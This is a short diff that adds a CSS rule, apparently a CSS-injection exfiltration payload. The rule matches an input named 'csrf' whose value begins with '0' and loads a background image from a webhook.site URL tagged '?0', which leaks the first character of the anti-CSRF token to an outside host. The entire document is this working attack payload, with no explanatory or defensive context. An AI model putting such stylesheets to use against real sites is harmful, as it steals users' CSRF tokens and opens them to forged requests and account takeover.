@@ -1,0 +1,3 @@
+input[name='csrf'][value^='0']~* {
+  background-image: url('https://webhook.site/0527f2e4-9001-46ad-bf0c-45744f062a2a?0');
+}
